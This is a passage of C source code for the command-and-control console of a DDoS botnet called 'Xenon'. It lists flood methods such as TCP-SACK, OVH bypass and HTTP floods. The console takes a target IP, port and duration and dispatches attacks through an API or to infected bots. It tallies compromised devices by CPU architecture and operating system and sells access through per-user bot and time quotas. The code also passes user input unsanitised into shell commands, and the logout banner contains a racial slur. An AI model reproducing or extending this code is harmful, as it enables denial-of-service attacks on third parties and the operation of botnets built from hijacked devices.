                        //printf("[\x1b[32m+\x1b[37m] Sent Request Headers to IPLookup API!\n");
#endif
                        sprintf(user, ""W"["G"IPLookup"W"] Getting Info For -> %s...\r\n", myhost);
                        if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
                        char ch;
                        int retrv = 0;
                        uint32_t header_parser = 0;
                        while(header_parser != 0x0D0A0D0A){
                            if((retrv = read(IPLSock, &ch, 1)) != 1) break;
                            header_parser = (header_parser << 8) | ch;
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer));
                        while(ret = read(IPLSock, iplbuffer, 1024)) iplbuffer[ret] = '\0';
                        if(strstr(iplbuffer, "<title>404")){
                            sprintf(iplookup_host_token, "%s", hostip);
                            int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                            sprintf(user, "\x1b[31m[IPLookup] Failed, API Can't Be Located On Server %d.*.*.*:80\r\n", ip_prefix);
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                        }
                        else if(strstr(iplbuffer, "nickers")) sprintf(user, "\x1b[31m[IPLookup] Failed, Hosting Server Needs To Have PHP Installed For API To Work...\r\n");
                        else sprintf(user, ""W"["G"+"W"]--- "G"Results"W" ---["G"+"W"]\r\n"W"%s\r\n", iplbuffer);
                        if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
                    }
                    else{
#ifdef DEBUG
                        //printf("[\x1b[31m-\x1b[37m] Failed To Send Request Headers...\n");
#endif
                        sprintf(user, "\x1b[31m[IPLookup] Failed To Send Request Headers...\r\n");
                        if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
                    }
                }
            }
            memset(buf, 0, sizeof(buf));
        }
        if(strstr(buf, "credit")) {
        	pthread_create(&title, NULL, &TitleWriter, sock);
        	char credit1 [800];
        	char credit2 [800];
        	char credit3 [800];
            char credit6 [800];


			sprintf(credit1,  ""G"╔════════════════════════════════════════════════════╗\r\n");
			sprintf(credit2,  ""G"║"W"  Big Thanks the The People Who helped With Xenon   "G"║\r\n");
			sprintf(credit3,  ""G"║"W"      @Edo.py Main Dev and Creator of Xenon         "G"║\r\n");
			sprintf(credit6,  ""G"╚════════════════════════════════════════════════════╝\r\n");

			if(send(datafd, credit1,  strlen(credit1), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, credit2,  strlen(credit2), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, credit3,  strlen(credit3), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, credit6,  strlen(credit6), MSG_NOSIGNAL) == -1) goto end;


        }
        if(strstr(buf, "api")) {
            pthread_create(&title, NULL, &TitleWriter, sock);
            char api1 [800];
            char api2 [800];
            char api3 [800];
            char api5 [800];
            char api6 [800];
            char api7 [800];
            char api8 [800];
            char apiA [800];
            char apiB [800];
            char apiC [800];
            char apiD [800];
            char apiE [800];
            char apiF [800];
            char apiG [800];
            char apiH [800];
            char apiI [800];
            char apiJ [800];
            char apiK [800];
            char apiL [800];
            char apiM [800];
            char apiN [800];
            char apiO [800];



            sprintf(api1,  ""G"╔═══════════════════════╗\r\n");
            sprintf(api2,  ""G"║"W" For API use apiattack "G"║\r\n");
            sprintf(api3,  ""G"║"W" API Methods:          "G"║\r\n");
            sprintf(api5,  ""G"║"W" SOAP                  "G"║\r\n");
            sprintf(api6,  ""G"║"W" IPX                   "G"║\r\n");
            sprintf(api7,  ""G"║"W" TCP-SACK              "G"║\r\n");
            sprintf(api8,  ""G"║"W" GRENADE               "G"║\r\n");
            sprintf(apiA,  ""G"║"W" OVH-NAT               "G"║\r\n");
            sprintf(apiB,  ""G"║"W" ARMA3                 "G"║\r\n");
            sprintf(apiC,  ""G"║"W" TCP-AMP               "G"║\r\n");
            sprintf(apiD,  ""G"║"W" UDPBypass             "G"║\r\n");
            sprintf(apiE,  ""G"║"W" WOLF                  "G"║\r\n");
            sprintf(apiF,  ""G"║"W" OpenVPN               "G"║\r\n");
            sprintf(apiG,  ""G"║"W" HTTP-GET              "G"║\r\n");
            sprintf(apiH,  ""G"║"W" OVH-X                 "G"║\r\n");
            sprintf(apiI,  ""G"║"W" HTTP-HEAD             "G"║\r\n");
            sprintf(apiJ,  ""G"║"W" HTTP-RAND             "G"║\r\n");
            sprintf(apiK,  ""G"║"W" HTTP-GOOGLE           "G"║\r\n");
            sprintf(apiL,  ""G"║"W" HTTP-NULL             "G"║\r\n");
            sprintf(apiM,  ""G"║"W" HTTP-BURST            "G"║\r\n");
            sprintf(apiN,  ""G"║"W" OVHBYPASSE            "G"║\r\n");
            sprintf(apiO,  ""G"╚═══════════════════════╝\r\n");

            if(send(datafd, api1,  strlen(api1), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, api2,  strlen(api2), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, api3,  strlen(api3), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, api5,  strlen(api5), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, api6,  strlen(api6), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, api7,  strlen(api7), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, api8,  strlen(api8), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiA,  strlen(apiA), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiB,  strlen(apiB), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiC,  strlen(apiC), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiD,  strlen(apiD), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiE,  strlen(apiE), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiF,  strlen(apiF), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiG,  strlen(apiG), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiH,  strlen(apiH), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiI,  strlen(apiI), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiJ,  strlen(apiJ), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiK,  strlen(apiK), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiL,  strlen(apiL), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiM,  strlen(apiM), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiN,  strlen(apiN), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, apiO,  strlen(apiO), MSG_NOSIGNAL) == -1) goto end;


        }

		if(strstr(buf, "apiattack"))
        {
			char beanersquad[1024];
            if(accounts[datafd].accessapi == 1)
            {
                char ip[80];
                char port[80];
                char time[80];
                char method[80];
   
                sprintf(beanersquad, ""G"IP"W": ");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                memset(buf, 0, sizeof buf);
                fdgets(buf, sizeof(buf), datafd);
                trim(buf);
                strcpy(ip, buf);
                sleep(0.5);
   
                sprintf(beanersquad, ""G"Port"W": ");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                memset(buf, 0, sizeof buf);
                fdgets(buf, sizeof(buf), datafd);
                trim(buf);
                strcpy(port, buf);
                sleep(0.5);
   
                sprintf(beanersquad, ""G"Time"W": ");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                memset(buf, 0, sizeof buf);
                fdgets(buf, sizeof(buf), datafd);
                trim(buf);
                strcpy(time, buf);
                sleep(0.5);
   
                sprintf(beanersquad, ""G"Method"W": ");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                memset(buf, 0, sizeof buf);
                fdgets(buf, sizeof(buf), datafd);
                trim(buf);
                strcpy(method, buf);
                sleep(0.5);
   
                apicall("spoofed", ip, port, method, time);
                FILE *uinfo = fopen("history.log", "a+");
                fprintf(uinfo, "User: [%s] IP: [%s] Port: [%s] Time: [%s] Method: [%s]\n", accounts[find_line].username, ip, port, time, method);
                fclose(uinfo);
                sprintf(beanersquad, "\033[1A\033[2J\033[1;1H");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                sprintf(beanersquad, "\x1b[37mAttack Sent!\r\n");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                sprintf(beanersquad, "IP\x1b[37m: %s\r\n", ip);
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                sprintf(beanersquad, "Port\x1b[37m: %s\r\n", port);
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                sprintf(beanersquad, "Time\x1b[37m: %s\r\n", time);
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                sprintf(beanersquad, "Method\x1b[37m: %s\r\n", method);
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                memset(uinfo, 0, sizeof(uinfo));
                memset(ip, 0, sizeof(ip));
                memset(port, 0, sizeof(port));
                memset(time, 0, sizeof(time));
                memset(method, 0, sizeof(method));
            }
            else
            {
                sprintf(beanersquad, ""R"You Do Not Have Access To Use the API\r\n");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
            }
        }
		if(strstr(buf, "blacklist"))
		{
			char sendbuf[1024];
			int i;
			if(accounts[datafd].admin == 1)
			{
				char iptoblacklist[1024];
				sprintf(sendbuf, "IP: ");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
				fdgets(iptoblacklist, strlen(iptoblacklist), datafd);
				for(i = 0; i < MAXFDS; i++)
				{
					strcpy(accounts[i].blacklist, iptoblacklist);
				}
			}
			else
			{
				sprintf(sendbuf, ""R"You Do Not Have Admin Perms!\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
			}
		}
		if(strstr(buf, "removeblacklist"))
		{
			char sendbuf[1024];
			int i;
			if(accounts[datafd].admin == 1)
			{
				char iptoblacklist[1024];
				sprintf(sendbuf, "IP: ");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
				fdgets(iptoblacklist, strlen(iptoblacklist), datafd);
				for(i = 0; i < MAXFDS; i++)
				{
					memset(accounts[i].blacklist, 0, iptoblacklist);
				}
			}
			else
			{
				sprintf(sendbuf, ""R"You Do Not Have Admin Perms!\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
			}
		}
		if(strstr(buf, "admin") || strstr(buf, "ADMIN"))
		{
			char sendbuf[1024];
			if(accounts[datafd].admin == 1)
			{
                sprintf(sendbuf, ""G"╔════════════════════════════════════════════════════╗\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                sprintf(sendbuf, ""G"║"W" adduser Adduser  (Admin ONLY)                      "G"║\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                sprintf(sendbuf, ""G"║"W" deleteuser Removes User (Admin ONLY)               "G"║\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                sprintf(sendbuf, ""G"║"W" online Shows Online Users                          "G"║\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                sprintf(sendbuf, ""G"║"W" blacklist Blacklist Ips From Connecting To CNC     "G"║\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                sprintf(sendbuf, ""G"║"W" removeblacklist To Remove Blacklisted IPS          "G"║\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                sprintf(sendbuf, ""G"╚════════════════════════════════════════════════════╝\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
            }
			else
			{
				sprintf(sendbuf, ""R"You Do Not Have Admin Perms!\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
			}
		}
        if(strstr(buf, "online"))
        {
            char botnet[512];
            if(strstr(accounts[find_line].id, ADMIN)) 
            {
                int i;
                for(i = 0; i < MAXFDS; i++)
                {
                    if(accounts[i].admin == 1)
                    {
                        sprintf(botnet, "User: %s index: %d\r\n", accounts[i].username, i);
                        send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL);
                    }
                    else if(accounts[i].normaluser == 1)
                    {
                        sprintf(botnet, "User: %s index: %d IP: %s\r\n", accounts[i].username, i, ipstructure[i].ip);
                        send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL);
                    }  
                }
                sprintf(botnet, "Total Users Connected: %d\r\n", OperatorsConnected);
                send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL);
            }
            else
            {
                sprintf(botnet, ""R"You Do Not Have Admin Perms!\r\n");
                send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL);
            }
        }
 		if(strstr(buf, "motd"))
 		{
			char sendbuf[1024];
			if(strstr(accounts[find_line].id, ADMIN)) 
            { 
 				memset(buf, 0, sizeof(buf));
 				sprintf(sendbuf, "MOTD: ");
 				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
 				fdgets(buf, sizeof(buf), datafd);
 				trim(buf);
 				motdaction = 1;
 				strcpy(motd, buf);
			}
			else
			{
				sprintf(sendbuf, ""R"You Do Not Have Admin Perms!\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
			}
			
 		}
		if(strstr(buf, "plan"))
		{
			char test[1024];
			sprintf(test, "Max Time Is %d\r\n", accounts[find_line].maxseconds);
			send(datafd, test, strlen(test), MSG_NOSIGNAL);
		}
		/*
		if(strstr(buf, "argvtest"))
		{
			char test[1024];
			int g, argc = 0;
          	unsigned char *argv[10 + 1] = { 0 }; // This is to count the amount of arguments
          	char *token = strtok(buf, " ");
          	while (token != NULL && argc < 10)
          	{
          	    argv[argc++] = malloc(strlen(token) + 1);
          	    strcpy(argv[argc - 1], token);
          	    token = strtok(NULL, " ");
          	}
			sprintf(test, "%s %d %d %d %d %d %d\r\n", argv[0], atoi(argv[1]), atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]), atoi(argv[6]));
			send(datafd, test, strlen(test), MSG_NOSIGNAL);
		}
		*/
		if(strstr(buf, "STD") || strstr(buf, "TCP") || strstr(buf, "UDP") || strstr(buf, "VSE") || strstr(buf, "KILLALL"))
		{
			char realbuf[1024];
			char senddata[1024];
			strcpy(realbuf, buf);
			int g, argc = 0;
        	unsigned char *argv[10 + 1] = { 0 }; // This is to count the amount of arguments
        	char *token = strtok(realbuf, " "); // thats fixed now lol
        	while (token != NULL && argc < 10)
        	{
        	    argv[argc++] = malloc(strlen(token) + 1);// here is what I need    Captcha   the thing were u can turn the trigger and capthca on and off and fix the thing when u login it will change your promt
        	    strcpy(argv[argc - 1], token);
        	    token = strtok(NULL, " ");
        	}
			int time = atoi(argv[4]); 
			int maxtime = accounts[find_line].maxseconds;
			if(time > maxtime)
			{
				sprintf(senddata, ""R"You Have Exceeded The Max Amount Of Time\r\n");
				send(datafd, senddata, strlen(senddata), MSG_NOSIGNAL);
			}
			else
			{
				sprintf(senddata, ""G"Attack Sent!\r\n");
				send(datafd, senddata, strlen(senddata), MSG_NOSIGNAL);
				broadcast(buf, datafd, MAXFDS, accounts[find_line].maxbots);
			}
			
		}
 		if(strstr(buf, "bots") || strstr(buf, "BOTS"))
        {  
            countArch();
            if(clientsConnected() == 0)
            {
                sprintf(botnet, ""G"users "W"["G"%d"W"]\r\n\x1b[0m", OperatorsConnected);
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
                sprintf(botnet, ""G"Users "W"["G"%d"W"]\r\n\x1b[0m", OperatorsConnected);
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                if(ppc != 0)
                {
                    sprintf(botnet, ""G"Xenon.powerpc "W"["G"%d"W"]\r\n\x1b[0m", ppc);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(sh4 != 0)
                {
                    sprintf(botnet, ""G"Xenon.sh4 "W"["G"%d"W"]\r\n\x1b[0m", sh4);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(x86 != 0)
                {
                    sprintf(botnet, ""G"Xenon.x86 "W"["G"%d"W"]\r\n\x1b[0m", x86);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv4 != 0)
                {
                    sprintf(botnet, ""G"Xenon.armv4 "W"["G"%d"W"]\r\n\x1b[0m", armv4);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv5 != 0)
                {
                    sprintf(botnet, ""G"Xenon.armv5 "W"["G"%d"W"]\r\n\x1b[0m", armv5);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv6 != 0)
                {
                    sprintf(botnet, ""G"Xenon.armv6 "W"["G"%d"W"]\r\n\x1b[0m", armv6);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv7 != 0)
                {
                    sprintf(botnet, ""G"Xenon.armv7 "W"["G"%d"W"]\r\n\x1b[0m", armv7);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(mips != 0)
                {
                    sprintf(botnet, ""G"Xenon.mips "W"["G"%d"W"]\r\n\x1b[0m", mips);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(m68k != 0)
                {
                    sprintf(botnet, ""G"Xenon.m68k "W"["G"%d"W"]\r\n\x1b[0m", m68k);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(debug != 0)
                {
                    sprintf(botnet, ""G"Xenon.debug "W"["G"%d"W"]\r\n\x1b[0m", debug);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(sparc != 0)
                {
                    sprintf(botnet, ""G"Xenon.sparc "W"["G"%d"W"]\r\n\x1b[0m", sparc);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(mipsel != 0)
                {
                    sprintf(botnet, ""G"Xenon.mipsel "W"["G"%d"W"]\r\n\x1b[0m", mipsel);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(unknown != 0)
                {
                    sprintf(botnet, ""G"Xenon.unknown "W"["G"%d"W"]\r\n\x1b[0m", unknown);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                sprintf(botnet, ""G"Total"W": ["G"%d"W"]\r\n\x1b[0m", clientsConnected());
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                if(accounts[find_line].maxbots < clientsConnected())
                {
                    sprintf(botnet, ""G"Available Bots "W"["G"%d"W"]\r\n\x1b[0m", accounts[find_line].maxbots);
                }
                else if(accounts[find_line].maxbots > clientsConnected())
                {
                    sprintf(botnet, ""G"Available Bots "W"["G"%d"W"]\r\n\x1b[0m", clientsConnected());
                }
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
        }
		if(strstr(buf, "oscount") || strstr(buf, "OSCOUNT"))
        {  
            countos();
            if(clientsConnected() == 0)
            {
                sprintf(botnet, ""G"users "W"["G"%d"W"]\r\n\x1b[0m", OperatorsConnected);
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
                sprintf(botnet, ""G"Users "W"["G"%d"W"]\r\n\x1b[0m", OperatorsConnected);
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                if(ubuntu != 0)
                {
                    sprintf(botnet, ""G"Ubuntu "W"["G"%d"W"]\r\n\x1b[0m", ubuntu);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(gentoo != 0)
                {
                    sprintf(botnet, ""G"Gentoo "W"["G"%d"W"]\r\n\x1b[0m", gentoo);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(centos != 0)
                {
                    sprintf(botnet, ""G"CentOS "W"["G"%d"W"]\r\n\x1b[0m", centos);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(opensuse != 0)
                {
                    sprintf(botnet, ""G"OpenSUSE "W"["G"%d"W"]\r\n\x1b[0m", opensuse);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(freebsd != 0)
                {
                    sprintf(botnet, ""G"FreeBSD "W"["G"%d"W"]\r\n\x1b[0m", freebsd);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(dropbear != 0)
                {
                    sprintf(botnet, ""G"Dropbear "W"["G"%d"W"]\r\n\x1b[0m", dropbear);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(openwrt != 0)
                {
                    sprintf(botnet, ""G"OpenWRT "W"["G"%d"W"]\r\n\x1b[0m", openwrt);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(unknown != 0)
                {
                    sprintf(botnet, ""G"unknown "W"["G"%d"W"]\r\n\x1b[0m", unknown);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                sprintf(botnet, ""G"Total"W": ["G"%d"W"]\r\n\x1b[0m", clientsConnected());
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                if(accounts[find_line].maxbots < clientsConnected())
                {
                    sprintf(botnet, ""G"Available Bots "W"["G"%d"W"]\r\n\x1b[0m", accounts[find_line].maxbots);
                }
                else if(accounts[find_line].maxbots > clientsConnected())
                {
                    sprintf(botnet, ""G"Available Bots "W"["G"%d"W"]\r\n\x1b[0m", clientsConnected());
                }
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
        }
			if(strstr(buf, "!* BOTKILL")) {
				char gtfomynet [2048];
				memset(gtfomynet, 0, 2048);
				sprintf(gtfomynet, "!* BOTKILL\r\n");
				broadcast(buf, datafd, gtfomynet, MAXFDS);
				continue;// 
			}
			if(strstr(buf, "adduser")) 
            { 
				char sendbuf[1024];
                if(strstr(accounts[find_line].id, ADMIN)) 
                { 
                    memset(buf, 0, 2048);
                    char usernametoadd[100]; 
                    char passwordtoadd[100]; 
                    char adminornah[100]; 
					char apiaccesslol[100]; 
                    char maxtime[100]; 
                    char maxbots[100]; 
                    char uinfo[500]; 
                    sprintf(sendbuf, ""G"Username"W": "); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                    fdgets(buf, sizeof(buf), datafd);
                    trim(buf);
                    strcpy(usernametoadd, buf); 
                    memset(buf, 0, 2048); 
                    sprintf(sendbuf, ""G"Password"W": "); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                    fdgets(buf, sizeof(buf), datafd); 
                    trim(buf);
                    strcpy(passwordtoadd, buf); 
                    memset(buf, 0, 2048); 
                    sprintf(sendbuf, ""G"Admin"W": "); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                    fdgets(buf, sizeof(buf), datafd); 
                    trim(buf);
                    if(strstr(buf, "yes")) 
                    { 
                        strcpy(adminornah, ADMIN);                                                                                                                                                                                                                                                                                         // E D O   M A D E   B Y  E D O                    
                    } 
                    else 
                    { 
                        strcpy(adminornah, "loser"); 
                    } 
					memset(buf, 0, 2048); 
                    sprintf(sendbuf, ""G"API Access"W": "); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                    fdgets(buf, sizeof(buf), datafd); 
                    trim(buf);
					if(strstr(buf, "yes")) 
                    { 
                        strcpy(apiaccesslol, "access"); 
                    } 
                    else 
                    { 
                        strcpy(apiaccesslol, "loser"); 
                    } 
                    sprintf(sendbuf, ""G"Max Time: "W": "); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                    fdgets(buf, sizeof(buf), datafd); 
                    trim(buf);
                    strcpy(maxtime, buf); 
                    memset(buf, 0, 2048); 
                    sprintf(sendbuf, ""G"Max Bots: "W": "); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                    fdgets(buf, sizeof(buf), datafd); 
                    trim(buf);
                    strcpy(maxbots, buf); 
                    memset(buf, 0, 2048); 
                    sprintf(uinfo, "echo '%s %s %s %s %s %s' >> login.txt", usernametoadd, passwordtoadd, adminornah, apiaccesslol, maxtime, maxbots); 
                    system(uinfo); 
                    sprintf(sendbuf, "Added User: %s\r\n", usernametoadd);
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                    memset(usernametoadd, 0, sizeof(usernametoadd)); 
                    memset(passwordtoadd, 0, sizeof(passwordtoadd)); 
                    memset(adminornah, 0, sizeof(adminornah)); 
                    memset(uinfo, 0, sizeof(uinfo));  
                } 
                else 
                { 
                    sprintf(sendbuf, "You Aren't Admin!\r\n"); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                } 
            } 
			if(strstr(buf, "deleteuser"))
			{
				if(strstr(accounts[find_line].id, ADMIN)) 
				{
					memset(buf, 0, sizeof(buf));
					char usertodel[100];
					char sendbuf[1024];
					char echobuf[1024];
					char command[100];

					sprintf(sendbuf, ""G"Username"W": ");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
					fdgets(buf, sizeof(buf), datafd);
					trim(buf);
					strcpy(usertodel, buf);
					strcpy(command, "sed -i '/");
					strcat(command, buf);
					strcat(command, "/d' login.txt");
					memset(buf, 0, sizeof(buf));
					sprintf(sendbuf, "Are You Sure?: ");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
					fdgets(buf, sizeof(buf), datafd);
					if(strstr(buf, "yes"))
					{
						system(command);
						sprintf(sendbuf, "Deleted User: %s\r\n", usertodel);
                    	send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
					}
					else
					{

					}
				}
			}
			if(strstr(buf, "CLEAR") || strstr(buf, "clear")) 
			{
				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
				goto Banner;
			}
			if(strstr(buf, "LOGOUT")) {
			pthread_create(&title, NULL, &TitleWriter, sock);
			char logoutmessage1 [2048];
			char logoutmessage2 [2048];
			char logoutmessage3 [2048];
			char logoutmessage4 [2048];
			char logoutmessage5 [2048];
			char logoutmessage6 [2048];

			sprintf(logoutmessage1, "\e[90m        _    _\r\n");
			sprintf(logoutmessage2, "     \e[97m__\e[38;5;202m|\e[97m_\e[38;5;202m|\e[97m__\e[38;5;202m|\e[97m_\e[38;5;202m|\e[97m__\r\n");
			sprintf(logoutmessage3, "\e[97m   \e[31m_\e[97m|\e[31m____________\e[97m|\e[31m__\r\n");
			sprintf(logoutmessage4, "\e[31m  |o o o o o o o o /  \r\n");
			sprintf(logoutmessage5, "\e[96m~~~~~~~~~~~~~~~~~~~~~~~~\r\n");
			sprintf(logoutmessage6, "\e[34mBIG BOATS MY NIGGA, YEET\r\n");

			if(send(datafd, logoutmessage1, strlen(logoutmessage1), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage2, strlen(logoutmessage2), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage3, strlen(logoutmessage3), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage4, strlen(logoutmessage4), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage5, strlen(logoutmessage5), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage6, strlen(logoutmessage6), MSG_NOSIGNAL) == -1)goto end;
			sleep(5);
			goto end;
			}

            trim(buf);
		char input [5000];
        sprintf(input, ""G"Xenon"W"@"G"%s"W": ", accounts[datafd].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",accounts[datafd].username, buf);

			FILE *LogFile;
            LogFile = fopen("history.log", "a");

			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[datafd].username, buf);
            fclose(LogFile);
            memset(buf, 0, 2048);
        }

		end:
		accounts[datafd].connected = 0;
		accounts[datafd].admin = 0;
		accounts[datafd].normaluser = 0;
		close(datafd);
		OperatorsConnected--;
}

char *client_addr(struct sockaddr_in addr)
{
    char *get_ip;

    asprintf(&get_ip, "%d.%d.%d.%d", addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00)>>8,
    (addr.sin_addr.s_addr & 0xFF0000)>>16,
    (addr.sin_addr.s_addr & 0xFF000000)>>24);

    return (char *)get_ip;
}

void *BotListener(int port) 
{
    int sockfd, newsockfd;
    socklen_t clilen;
    struct sockaddr_in serv_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    //bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);

    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
